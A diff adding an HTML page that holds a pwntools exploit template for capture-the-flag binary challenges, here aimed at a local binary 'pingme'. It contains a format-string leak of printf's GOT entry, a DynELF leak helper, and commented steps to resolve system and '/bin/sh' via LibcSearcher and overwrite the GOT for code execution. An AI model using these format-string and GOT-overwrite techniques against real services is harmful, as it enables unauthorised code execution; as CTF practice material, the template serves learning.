@@ -1,0 +1,148 @@
+<h1 id="template"><a aria-hidden="true" class="anchor-heading icon-link" href="#template"></a>Template</h1>
+<h2 id="pwn题模板"><a aria-hidden="true" class="anchor-heading icon-link" href="#pwn题模板"></a>pwn题模板</h2>
+<pre class="language-py"><code class="language-py"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span> 
+<span class="token keyword">import</span> os
+<span class="token comment"># ========================================</span>
+is_debug <span class="token operator">=</span> <span class="token boolean">False</span>
+is_debug <span class="token operator">=</span> <span class="token boolean">True</span>
+architecture <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"arch"</span><span class="token punctuation">:</span><span class="token string">"i386"</span><span class="token punctuation">,</span><span class="token string">"os"</span><span class="token punctuation">:</span><span class="token string">"linux"</span><span class="token punctuation">,</span><span class="token string">"endian"</span><span class="token punctuation">:</span><span class="token string">"little"</span><span class="token punctuation">,</span><span class="token string">"bits"</span><span class="token punctuation">:</span><span class="token number">64</span><span class="token punctuation">}</span>
+architecture <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"arch"</span><span class="token punctuation">:</span><span class="token string">"amd64"</span><span class="token punctuation">,</span><span class="token string">"os"</span><span class="token punctuation">:</span><span class="token string">"linux"</span><span class="token punctuation">,</span><span class="token string">"endian"</span><span class="token punctuation">:</span><span class="token string">"little"</span><span class="token punctuation">,</span><span class="token string">"bits"</span><span class="token punctuation">:</span><span class="token number">32</span><span class="token punctuation">}</span>
+<span class="token comment"># is_remote = True</span>
+is_remote <span class="token operator">=</span> <span class="token boolean">False</span>
+ip <span class="token operator">=</span> <span class="token string">""</span>
+port <span class="token operator">=</span> <span class="token string">""</span>
+target <span class="token operator">=</span> <span class="token string">"./pingme"</span>
+target_libc <span class="token operator">=</span> <span class="token string">""</span>
+env <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+
+<span class="token comment"># ========================================</span>
+<span class="token keyword">def</span> <span class="token function">_which</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">return</span> os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"which "</span> <span class="token operator">+</span> p <span class="token operator">+</span> <span class="token string">" >/dev/null 2>&#x26;1"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span>
+
+
+
+<span class="token comment"># ========================================</span>
+<span class="token keyword">if</span> is_debug<span class="token punctuation">:</span>
+    context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>
+<span class="token keyword">else</span><span class="token punctuation">:</span>
+    context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'info'</span>
+context<span class="token punctuation">(</span>os<span class="token operator">=</span>architecture<span class="token punctuation">[</span><span class="token string">"os"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>arch<span class="token operator">=</span>architecture<span class="token punctuation">[</span><span class="token string">"arch"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>bits<span class="token operator">=</span>architecture<span class="token punctuation">[</span><span class="token string">"bits"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+elf <span class="token operator">=</span> <span class="token string">""</span>
+libc <span class="token operator">=</span> <span class="token string">""</span>
+<span class="token keyword">if</span> target<span class="token punctuation">:</span>
+    context<span class="token punctuation">.</span>binary <span class="token operator">=</span> target
+    elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>target<span class="token punctuation">)</span>
+<span class="token keyword">if</span> target_libc<span class="token punctuation">:</span>
+    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span>target_libc<span class="token punctuation">)</span>
+
+<span class="token keyword">if</span> _which<span class="token punctuation">(</span><span class="token string">"tmux"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'splitw'</span><span class="token punctuation">,</span> <span class="token string">'-h'</span><span class="token punctuation">]</span>
+<span class="token keyword">elif</span> _which<span class="token punctuation">(</span><span class="token string">'gnome-terminal'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'--'</span><span class="token punctuation">,</span> <span class="token string">'sh'</span><span class="token punctuation">,</span> <span class="token string">'-c'</span><span class="token punctuation">]</span>
+<span class="token keyword">else</span><span class="token punctuation">:</span>
+    terminal <span class="token operator">=</span> <span class="token boolean">None</span>
+context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> terminal
+
+<span class="token keyword">if</span> is_remote<span class="token punctuation">:</span>
+    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+        <span class="token keyword">try</span><span class="token punctuation">:</span>
+            io<span class="token operator">=</span>remote<span class="token punctuation">(</span>ip<span class="token punctuation">,</span>port<span class="token punctuation">)</span>
+        <span class="token keyword">except</span><span class="token punctuation">:</span>
+            log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"remote:too many requests,I am tried,sleep one second please"</span><span class="token punctuation">)</span>
+            sleep<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>
+            <span class="token keyword">continue</span>
+        <span class="token keyword">break</span>
+<span class="token keyword">else</span><span class="token punctuation">:</span>
+    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+        <span class="token keyword">try</span><span class="token punctuation">:</span>
+            io<span class="token operator">=</span>process<span class="token punctuation">(</span>target<span class="token punctuation">)</span>
+        <span class="token keyword">except</span><span class="token punctuation">:</span>
+            log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"local:too many process,I can not malloc any memory"</span><span class="token punctuation">)</span>
+            log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"bye~~"</span><span class="token punctuation">)</span>
+            exit<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token keyword">break</span>
+
+<span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>gdbscript<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">,</span> stop<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>io<span class="token punctuation">,</span> process<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> stop<span class="token punctuation">:</span>
+            pause<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span> gdbscript<span class="token operator">=</span>gdbscript<span class="token punctuation">)</span>
+
+stop <span class="token operator">=</span> pause
+S <span class="token operator">=</span> pause
+leak <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span> address<span class="token punctuation">:</span> log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"{{}} ===> {{}}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+s   <span class="token operator">=</span> io<span class="token punctuation">.</span>send
+sl  <span class="token operator">=</span> io<span class="token punctuation">.</span>sendline
+sla <span class="token operator">=</span> io<span class="token punctuation">.</span>sendlineafter
+sa  <span class="token operator">=</span> io<span class="token punctuation">.</span>sendafter
+slt <span class="token operator">=</span> io<span class="token punctuation">.</span>sendlinethen
+st  <span class="token operator">=</span> io<span class="token punctuation">.</span>sendthen
+r   <span class="token operator">=</span> io<span class="token punctuation">.</span>recv
+rn  <span class="token operator">=</span> io<span class="token punctuation">.</span>recvn
+rr  <span class="token operator">=</span> io<span class="token punctuation">.</span>recvregex
+ru  <span class="token operator">=</span> io<span class="token punctuation">.</span>recvuntil
+ra  <span class="token operator">=</span> io<span class="token punctuation">.</span>recvall
+rl  <span class="token operator">=</span> io<span class="token punctuation">.</span>recvline
+rs  <span class="token operator">=</span> io<span class="token punctuation">.</span>recvlines
+rls <span class="token operator">=</span> io<span class="token punctuation">.</span>recvline_startswith
+rle <span class="token operator">=</span> io<span class="token punctuation">.</span>recvline_endswith
+rlc <span class="token operator">=</span> io<span class="token punctuation">.</span>recvline_contains
+ia  <span class="token operator">=</span> io<span class="token punctuation">.</span>interactive
+ic  <span class="token operator">=</span> io<span class="token punctuation">.</span>close
+cr  <span class="token operator">=</span> io<span class="token punctuation">.</span>can_recv
+
+buffer_padding <span class="token operator">=</span> <span class="token keyword">lambda</span> offset <span class="token punctuation">:</span> offset<span class="token operator">*</span><span class="token string">'A'</span>
+
+<span class="token keyword">def</span> <span class="token function">exec_fmt</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+    info <span class="token operator">=</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> info
+<span class="token comment"># auto = FmtStr(exec_fmt)</span>
+<span class="token comment"># offset = auto.offset</span>
+<span class="token comment"># fmtstr_payload(7, {printf_got: system_addr})</span>
+
+<span class="token keyword">def</span> <span class="token function">DynELF_leak</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    p <span class="token operator">=</span> process<span class="token punctuation">(</span>target<span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    payload <span class="token operator">=</span> <span class="token string">b"%9$s.AAA"</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>addr<span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+    data <span class="token operator">=</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">".AAA"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span> 
+    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"leaking: 0x%x --> %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>addr<span class="token punctuation">,</span> data<span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> data
+<span class="token comment"># data = DynELF(DynELF_leak, elf.plt["printf"],elf=elf)     # Entry point address</span>
+<span class="token comment"># system_addr = data.lookup('system', 'libc')</span>
+<span class="token comment"># printf_addr = data.lookup('printf', 'libc')</span>
+<span class="token comment"># log.info("system address: 0x%x" % system_addr)</span>
+<span class="token comment"># log.info("printf address: 0x%x" % printf_addr)</span>
+
+
+<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> LibcSearcher
+<span class="token comment"># libc_searcher = LibcSearcher('__libc_start_main', libc_start_main_addr)</span>
+<span class="token comment"># libcbase = libc_start_main_addr - libc_searcher.dump('__libc_start_main')</span>
+<span class="token comment"># system_addr = libcbase + libc_searcher.dump('system')</span>
+<span class="token comment"># binsh_addr = libcbase + libc_searcher.dump('str_bin_sh')</span>
+<span class="token comment"># libc_searcher = LibcSearcher('printf', printf_addr)</span>
+<span class="token comment"># libcbase = printf_addr - libc_searcher.dump('printf')</span>
+<span class="token comment"># system_addr = libcbase + libc_searcher.dump('system')</span>
+
+<span class="token comment"># ========================================</span>
+
+
+S<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+
+<span class="token comment"># debug(gdbscript="b *main\r\nb printf")</span>
+<span class="token comment"># print(hex(elf.got["printf"]))</span>
+printf_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"printf"</span><span class="token punctuation">]</span>
+payload <span class="token operator">=</span> <span class="token string">b"%9$s.AAA"</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>printf_got<span class="token punctuation">)</span>
+rl<span class="token punctuation">(</span><span class="token punctuation">)</span>
+sl<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+data <span class="token operator">=</span> ru<span class="token punctuation">(</span><span class="token string">".AAA"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span>
+printf_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
+log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"printf address: %s"</span> <span class="token operator">%</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>printf_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+
+ia<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token comment"># S()</span>
+</code></pre>
